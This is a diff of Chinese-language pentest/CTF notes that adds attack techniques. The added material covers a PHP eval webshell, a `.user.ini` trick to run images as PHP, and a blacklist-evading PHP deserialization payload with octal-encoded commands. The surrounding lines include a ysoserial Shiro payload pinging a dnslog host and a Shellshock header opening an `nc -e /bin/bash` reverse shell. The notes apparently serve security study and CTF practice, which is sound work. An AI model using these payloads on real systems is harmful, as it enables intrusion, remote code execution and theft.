@@ -292,10 +292,13 @@ curl -H "X-Frame-Options: () { :; }; echo; /bin/bash -c 'nc -e /bin/bash 192.168
 1. 替换大小写
 2. 文件名后加空格/`.`/`::$DATA`
 3. 双写，如 `.pphphp`
+4. 使用短标签，如 `<?=eval($_POST['cmd']);?>`
 后端拦截常规处理：
 1. 修改MIME-Type
 2. 改文件内容，头部加上 `GIF89a;`
 3. 制作图片马
+只能上传图片：
+1. 上传 `.user.ini` 强制解析图片内容，使用 `auto_prepend_file=a.jpg` 或 `auto_append_file=a.jpg`
 webdav上传：[[11 安全工具#davtest|davtest]]
 
 ## SSRF
@@ -331,6 +334,26 @@ echo serialize($obj);
 echo "\n";
 echo urlencode(serialize($obj));
 echo "\n";
+?>
+```
+
+```PHP
+<?php
+class ease {
+	private $method = "ping";
+	# 双引号/IFS 绕过黑名单
+	private $args = array('l""s${IFS}fl""ag_1s_here');
+	# 十进制编码后执行 绕过黑名单
+	private $tset = array('$(printf${IFS}"\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160")');
+}
+
+$obj = new ease();
+$sd_obj = serialize($obj);
+echo $sd_obj;
+echo "\n";
+echo urlencode($sd_obj);
+echo "\n";
+echo base64_encode($sd_obj);
 ?>
 ```
 反序列化技术的核心：将字符流（通信对象）转化为程序对象
@@ -15816,7 +15839,7 @@ sudo msfconsole -q
 ```Shell
 java -jar /home/kali/Tools/Jars/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsBeanutils1 "ping -c 2 hfwdm4.dnslog.cn" > poc.ser
 
-java -cp .:libs/shiro-core-1.10.1.jar:libs/slf4j-api-2.0.6.jar EncodePayload
+java -cp .:libs/shiro-core-1.2.4.jar:libs/slf4j-api-1.6.4.jar EncodePayload
 ```
 反弹shell
 ```Shell
